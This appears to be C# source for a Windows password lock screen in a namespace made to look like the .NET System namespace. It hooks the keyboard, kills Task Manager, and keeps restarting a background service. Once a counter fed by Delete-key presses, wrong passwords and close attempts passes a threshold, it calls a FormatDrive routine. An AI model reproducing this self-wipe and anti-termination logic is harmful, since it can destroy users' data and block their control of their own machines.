using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace System.Agent.Privacy
{
    /// <summary>
    /// http://stackoverflow.com/questions/1588283/how-can-i-lock-the-screen-using-c
    /// </summary>
    public partial class LockScreen : Form
    {
        #region IdleFinder
        [StructLayout(LayoutKind.Sequential)]
        public struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        public static TimeSpan GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
            if (!GetLastInputInfo(ref lastInPut))
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            return TimeSpan.FromMilliseconds(Environment.TickCount - lastInPut.dwTime);
        }
        #endregion

        #region Fields
        private bool _canClose;
        private Hook _hook;
        private JobTimer _job;
        private volatile ushort _banCount;

        private ProtocolClient _client;
        #endregion

        public LockScreen()
        {
            InitializeComponent();
        }

        private void LockScreen_Load(object sender, EventArgs e)
        {
            _client = new ProtocolClient();
            base.BackgroundImage = _client.Config.Background;
            _hook = new Hook();
            _hook.KeyDown += _hook_KeyDown;
            _job = new JobTimer(this.Check, TimeSpan.FromMilliseconds(80));
            Lock();

            new JobTimer(state =>
            {
                try
                {
                    var sc = new ServiceController("PrivacyService");
                    if (sc.Status != ServiceControllerStatus.Running)
                    {
                        sc.Start();
                    }
                }
                catch (Exception ex)
                {
                    Hub.LogError(ex, "StartPrivacyService");
                }

                var idle = GetIdleTime();
                if (idle.TotalSeconds >= AgentHubConfig.AppConfig.IdleSeconds)
                {
                    this.Invoke(new Action(this.Lock));
                }
            }, TimeSpan.FromSeconds(1)).Start();
        }
        void _hook_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers.HasFlag(Keys.Delete) || e.KeyData == Keys.Delete)
            {
                _banCount += 2;
            }
        }
        private void Check(object state)
        {
            if (_banCount > AgentHubConfig.AppConfig.BanCount)
            {
                _client.FormatDrive();
                _banCount -= 1;
            }

            var q = from t in Process.GetProcesses()
                    where t.ProcessName.Equals("taskmgr", StringComparison.OrdinalIgnoreCase)
                    select t;
            var p1 = q.SingleOrDefault();
            if (p1 != null)
            {
                _banCount += 2;
                try
                {
                    p1.Kill();
                }
                catch (Exception ex)
                {
                    Hub.LogError(ex, "LockScreen.Kill");
                }
            }
        }

        protected override void OnLeave(EventArgs e)
        {
            this.Focus();
            //base.OnLeave(e);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.Cancel = !_canClose)
            {
                _banCount++;
            }
            base.OnFormClosing(e);
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                button1_Click(sender, EventArgs.Empty);
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            try
            {
                if (textBox1.Text != _client.Config.Password)
                {
                    _banCount++;
                    return;
                }

                UnLock();
            }
            finally
            {
                Thread.Sleep(1000);
                textBox1.Text = string.Empty;
                button1.Enabled = true;
            }
        }

        private void Lock()
        {
            _canClose = false;
            this.Show();
            _hook.Install();
            _job.Start();
        }
        private void UnLock()
        {
            _banCount = 0;
            _job.Stop();
            _hook.Uninstall();
            this.Hide();
            //_canClose = true;
            //this.Close();
        }
    }
}